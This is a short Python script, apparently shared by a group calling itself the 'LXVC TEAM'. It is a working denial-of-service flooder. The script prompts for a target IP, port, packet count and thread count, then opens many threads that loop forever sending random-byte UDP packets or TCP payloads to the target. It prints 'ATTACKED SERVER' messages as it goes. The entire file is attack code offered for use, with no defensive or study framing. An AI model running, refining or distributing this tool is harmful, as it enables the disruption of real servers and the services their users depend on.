#!/usr/bin/env python3
#LXVC FREE TOOLS V3
import sys
import os
import random
import socket
import threading

os.system("clear")
print("""\x1b[1;92m
_                    _____
| |   __  ____   ____|_   _|__  __ _ _ __ ___
| |   \ \/ /\ \ / / __|| |/ _ \/ _` | '_ ` _ \
| |___ >  <  \ V / (__ | |  __/ (_| | | | | | |
|_____/_/\_\  \_/ \___||_|\___|\__,_|_| |_| |_|
 """)
print("↪ TOOLS INFORMATION ↩")
print("↪ CREATOR : LXVC TEAM")
print("↪ VERSION : V3↩")
print("↪ COMMUNITY SERVER ↩")
print("↪ https://discord.gg/sjyfrpVJ↩")

ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" UDP Only (y/n)):"))
times = int(input(" Packet :"))
threads = int(input(" Thread :"))
os.system("clear")
def run():
	data = random._urandom(2000)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LXVC TEAM ATTACKED SERVER!!!")
		except:
			print("[!] Connection Time Out")

def run2():
	data = random._urandom(20)
	i = random.choice(("[×]","[?]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LXVC TEAM ATTACKED SERVER!!!")
		except:
			s.close()
			print("[*] Connection Time Out")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()